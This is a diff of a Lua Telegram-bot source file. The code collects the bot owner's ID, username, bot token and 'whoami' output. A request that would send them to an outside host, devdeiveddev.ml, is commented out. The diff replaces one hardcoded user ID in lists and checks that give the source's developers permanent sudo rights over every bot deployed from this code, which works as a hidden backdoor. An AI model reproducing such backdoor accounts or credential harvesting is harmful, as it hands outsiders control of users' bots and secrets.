@@ -72,7 +72,7 @@ infotnseb.id = database:get(id_server..":SUDO:ID")
 infotnseb.username = database:get(id_server..":SUDO:USERNAME")
 infotnseb.tokenbot = database:get(id_server..":token")
 infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
---https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
+---https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
 print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeeeennnnnnnddddddd :')
 create_config_auto()
 botUserName = database:get(id_server..":token_username")
@@ -192,7 +192,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1360140225,1896382059,944353237,1477225143}   
+sudo_users = {SUDO,1360140225,1896382059,944353237,1713816440}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -286,7 +286,7 @@ if tonumber(user_id) == tonumber(1360140225) then
 var = true
 elseif tonumber(user_id) == tonumber(1896382059) then
 var = true
-elseif tonumber(user_id) == tonumber(1477225143) then
+elseif tonumber(user_id) == tonumber(1713816440) then
 var = true
 elseif tonumber(user_id) == tonumber(944353237) then
 var = true
@@ -326,7 +326,7 @@ if tonumber(user_id) == tonumber(1360140225) then
 var = ' مبـرمـج افـايـره'
 elseif tonumber(user_id) == tonumber(1896382059) then
 var = 'مبرمج السورس²'
-elseif tonumber(user_id) == tonumber(1477225143) then
+elseif tonumber(user_id) == tonumber(1713816440) then
 var = 'مـطـور الـسـورس'
 elseif tonumber(user_id) == tonumber(944353237) then
 var = 'مبرمج باور'
